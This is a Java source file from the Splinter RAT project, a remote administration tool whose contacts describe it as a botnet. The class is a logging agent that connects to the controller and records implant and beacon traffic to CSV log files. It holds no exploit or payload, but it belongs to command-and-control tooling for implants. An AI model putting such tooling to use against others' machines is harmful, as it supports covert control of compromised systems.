/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.GUI;

import Implant.Driver;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ConnectException;
import java.net.Socket;

public class Splinter_LOGGIE extends Thread
  implements Runnable
{
  public static final String strMyClassName = "Splinter_LOGGIE";
  public static File myOutputTopDirectory = null;
  public static File myLogDirectory = null;
  public static File myLogFile_CONVERTED = null;
  public static File myLogFile_RAW = null;

  public static PrintWriter pwOut_LogFile_CONVERTED = null;
  public static PrintWriter pwOut_LogFile_RAW = null;

  boolean continueRun = true;

  String strLoggingDirectoryText = "Log";
  String strLoggingFileExtension = "log";

  String trafficDirectionIcon_OUT = "->";
  String trafficDirectionText_OUT = "OUT";

  String trafficDirectionIcon_IN = "<-";
  String trafficDirectionText_IN = "IN";

  String trafficDirectionIcon = "";
  String trafficDirectionText = "";

  String preamble = "";

  String[] arrCmd = null;

  String csvHeader = "Time, Time[Epoch], Traffic Direction, Traffic Direction, Thread ID, Agent Registration ID, Source Type, Destination Type, Source IP, Destination IP, Actual Traffic Data...";

  public static String separation_delimiter = ",";

  String controllerAddress = "";
  int controllerPORT = 0;

  Socket sktConnection = null;

  BufferedReader brIn = null;
  PrintWriter pwOut = null;

  public String myRegistrationID = "";

  public Splinter_LOGGIE(String controllerAddr, int controllerPort, String outFileTopFolder)
  {
    try
    {
      this.controllerAddress = controllerAddr;
      this.controllerPORT = controllerPort;

      myOutputTopDirectory = new File(outFileTopFolder);

      if ((myOutputTopDirectory == null) || (!myOutputTopDirectory.exists()) || (!myOutputTopDirectory.isDirectory()))
      {
        Driver.jop_Error("Invalid Logging Directory Specified", "Unable to continue...");
        myOutputTopDirectory = selectLoggingTopDirectory();
      }

      this.continueRun = configureEnvironmentForLogging(myOutputTopDirectory);

      Driver.sop("Configuration complete. All required data should be setup. Launching thread...");
      start();
    }
    catch (Exception e)
    {
      Driver.eop("Splinter_LOGGIE Constructor", "Splinter_LOGGIE", e, "", false);
    }
  }

  public void run()
  {
    try
    {
      if (this.continueRun)
      {
        Driver.sop("In thread run... ready to continue...");

        this.continueRun = authenticateWithController(this.controllerAddress, this.controllerPORT);

        String inputLine = "";

        String[] msgToLog = (String[])null;
        boolean directionComingIn = false;
        do
        {
          try
          {
            msgToLog = inputLine.split("@@@@@");

            if ((msgToLog != null) && (msgToLog.length >= 1))
            {
              if (msgToLog[0].trim().equalsIgnoreCase("true"))
              {
                directionComingIn = true;
              }
              else
              {
                directionComingIn = false;
              }

              if ((msgToLog[7].contains("BEACON")) && (msgToLog[3].trim().equalsIgnoreCase("UNKNOWN")))
              {
                msgToLog[3] = "SPLINTER - BEACON IMPLANT";
              }

              log(directionComingIn, msgToLog[1], msgToLog[2], msgToLog[3], msgToLog[4], msgToLog[5], msgToLog[6], msgToLog[7]);
            }
          }
          catch (Exception e) {
            Driver.sop("Unknown line, skipping logging of: " + inputLine);
          }
          if ((!this.continueRun) || (this.sktConnection.isClosed()) || ((inputLine = this.brIn.readLine()) == null)) break;  } while (!inputLine.equals("disconnectLogger"));
      }
      else
      {
        Driver.sop("Unable to start logger agent. Terminating this thread...");
      }

    }
    catch (ConnectException ee)
    {
      Driver.sop("\nConnection Closed!\n");
    }
    catch (Exception e)
    {
      Driver.sop("\nConnection Closed!!! \n");
    }

    try
    {
      Driver.sp("Closing streams to logging files now...");

      pwOut_LogFile_CONVERTED.close();
      pwOut_LogFile_RAW.close();

      Driver.sp("Streams closed. \n");
    } catch (Exception localException1) {
    }
    Driver.sop("Connection Terminated.  Closing Logging Agent Program...");

    System.exit(0);
  }

  public boolean authenticateWithController(String addr, int port)
  {
    try
    {
      Driver.sop("\n" + Driver.getTimeStamp_Without_Date() + "  Attempting to establish socket to " + addr + " : " + port + "...");

      this.sktConnection = new Socket(addr, port);

      if (this.sktConnection == null)
      {
        throw new Exception("null socket returned!. Contact Solo and ref error Code 20130203");
      }

      String inputLine = "";
      this.brIn = null;
      this.pwOut = null;

      Driver.sp("Connection established!  Attempting to open streams on socket...");

      this.brIn = new BufferedReader(new InputStreamReader(this.sktConnection.getInputStream()));

      this.pwOut = new PrintWriter(new BufferedOutputStream(this.sktConnection.getOutputStream()));

      Driver.sop("Streams opened");

      String handShakeData = Driver.getHandshakeData("%%%%%");

      sendToController("[SPLINTER_LOGGIE_AGENT]" + handShakeData);

      this.myRegistrationID = this.brIn.readLine();

      Driver.sop("HandShake complete. [SPLINTER@" + this.myRegistrationID + "]");

      return true;
    }
    catch (ConnectException ee)
    {
      Driver.sop("\nConnection Failed!  Unable to establish socket with " + addr + " : " + port + "\n");
    }
    catch (Exception e)
    {
      Driver.sop("\nConnection Failed!  Unable to establish socket with " + addr + " : " + port + "\n");
    }

    return false;
  }

  public boolean sendToController(String lineToSend)
  {
    try
    {
      if ((this.pwOut == null) || (this.sktConnection == null) || (!this.sktConnection.isConnected()))
      {
        Driver.sop("socket not yet connected");
        return false;
      }

      this.pwOut.println(lineToSend);
      this.pwOut.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendToController", "Splinter_LOGGIE", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean log(boolean directionIN, String threadID, String agentRegistrationID, String sender, String recipient, String senderIP, String recipientIP, String line)
  {
    try
    {
      if ((line == null) || (line.trim().equals(""))) {
        return false;
      }
      if (directionIN)
      {
        this.trafficDirectionIcon = this.trafficDirectionIcon_IN;
        this.trafficDirectionText = this.trafficDirectionText_IN;
      }
      else
      {
        this.trafficDirectionIcon = this.trafficDirectionIcon_OUT;
        this.trafficDirectionText = this.trafficDirectionText_OUT;
      }

      this.preamble = (Driver.getTimeStamp_Without_Date() + separation_delimiter + Driver.getTime_Current_Millis() + separation_delimiter + this.trafficDirectionText + separation_delimiter + this.trafficDirectionIcon + separation_delimiter + threadID + separation_delimiter + agentRegistrationID + separation_delimiter + sender + separation_delimiter + recipient + separation_delimiter + senderIP + separation_delimiter + recipientIP + separation_delimiter);

      writeToLog_RAW(this.preamble + line.trim());

      this.arrCmd = line.split("%%%%%");
      writeToLog_CONVERTED(this.preamble + this.arrCmd[0]);

      for (int i = 1; i < this.arrCmd.length; i++)
      {
        writeToLog_CONVERTED(separation_delimiter + this.arrCmd[i]);
      }

      writeLnToLog_RAW("\n");
      writeLnToLog_CONVERTED("\n");

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("log", "Splinter_LOGGIE", e, "", false);
    }

    return false;
  }

  public boolean writeLnToLog_RAW(String log)
  {
    try
    {
      pwOut_LogFile_RAW.println(log);
      pwOut_LogFile_RAW.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("writeToLog_RAW", "Splinter_LOGGIE", e, "", false);
    }

    return false;
  }

  public boolean writeLnToLog_CONVERTED(String log)
  {
    try
    {
      pwOut_LogFile_CONVERTED.println(log);
      pwOut_LogFile_CONVERTED.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("writeToLog_RAW", "Splinter_LOGGIE", e, "", false);
    }

    return false;
  }

  public boolean writeToLog_RAW(String log)
  {
    try
    {
      pwOut_LogFile_RAW.print(log);
      pwOut_LogFile_RAW.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("writeToLog_RAW", "Splinter_LOGGIE", e, "", false);
    }

    return false;
  }

  public boolean writeToLog_CONVERTED(String log)
  {
    try
    {
      pwOut_LogFile_CONVERTED.print(log);
      pwOut_LogFile_CONVERTED.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("writeToLog_RAW", "Splinter_LOGGIE", e, "", false);
    }

    return false;
  }

  public boolean configureEnvironmentForLogging(File topDirectory)
  {
    try
    {
      Driver.sop("Configuring system for logging...");
      if (topDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
        myLogDirectory = new File(topDirectory.getCanonicalPath() + this.strLoggingDirectoryText);
      else {
        myLogDirectory = new File(topDirectory.getCanonicalPath() + Driver.fileSeperator + this.strLoggingDirectoryText);
      }
      if ((!myLogDirectory.exists()) || (!myLogDirectory.isDirectory()))
      {
        boolean success = myLogDirectory.mkdir();

        if (!success)
        {
          throw new Exception("Could not create top directory");
        }

      }

      Driver.sop("Logging Directory placed at: " + myLogDirectory.getCanonicalPath());
      Driver.sop("Configuring logging files now...");

      String time = Driver.getTime_Specified_Hyphenated(Driver.getTime_Current_Millis());

      if (myLogDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
      {
        myLogFile_RAW = new File(myLogDirectory.getCanonicalPath() + time + "-SPLINTER_RAW." + this.strLoggingFileExtension);
        myLogFile_CONVERTED = new File(myLogDirectory.getCanonicalPath() + time + "-SPLINTER." + this.strLoggingFileExtension);
      }
      else
      {
        myLogFile_RAW = new File(myLogDirectory.getCanonicalPath() + Driver.fileSeperator + time + "-SPLINTER_RAW." + this.strLoggingFileExtension);
        myLogFile_CONVERTED = new File(myLogDirectory.getCanonicalPath() + Driver.fileSeperator + time + "-SPLINTER." + this.strLoggingFileExtension);
      }

      pwOut_LogFile_CONVERTED = new PrintWriter(new BufferedOutputStream(new FileOutputStream(myLogFile_CONVERTED.toString())));
      pwOut_LogFile_RAW = new PrintWriter(new BufferedOutputStream(new FileOutputStream(myLogFile_RAW.toString())));

      pwOut_LogFile_CONVERTED.println("Splinter - RAT vrs 1.41 - BETA \t[Log File] Created on " + Driver.getTimeStamp_Updated() + "\n\n");
      pwOut_LogFile_RAW.println("Splinter - RAT vrs 1.41 - BETA \t[Log File] Created on " + Driver.getTimeStamp_Updated() + "\n\n");
      pwOut_LogFile_CONVERTED.flush();
      pwOut_LogFile_RAW.flush();

      writeLnToLog_CONVERTED(this.csvHeader);
      writeLnToLog_RAW(this.csvHeader);

      Driver.sop("\nRAW log file successfully created at: \n" + myLogFile_RAW.getCanonicalPath());
      Driver.sop("\nCONVERTED log file successfully created at: \n" + myLogFile_CONVERTED.getCanonicalPath() + "\n");

      return true;
    }
    catch (Exception e)
    {
      Driver.jop("Unable to configure environment for logging, please specify a new directory");

      File fle = selectLoggingTopDirectory();
      return configureEnvironmentForLogging(fle);
    }
  }

  public File selectLoggingTopDirectory()
  {
    try {
      myOutputTopDirectory = Driver.querySelectFile(false, "Please Select the Directory to save log files", 1, false, false);

      if ((myOutputTopDirectory == null) || (!myOutputTopDirectory.exists()) || (!myOutputTopDirectory.isDirectory()))
      {
        Driver.jop_Error("Invalid Logging Directory Specified", "Unable to continue...");
        return selectLoggingTopDirectory();
      }

      return myOutputTopDirectory;
    }
    catch (Exception e)
    {
      Driver.jop_Error("Invalid Logging Directory Specified", "Unable to continue...");
    }

    return selectLoggingTopDirectory();
  }
}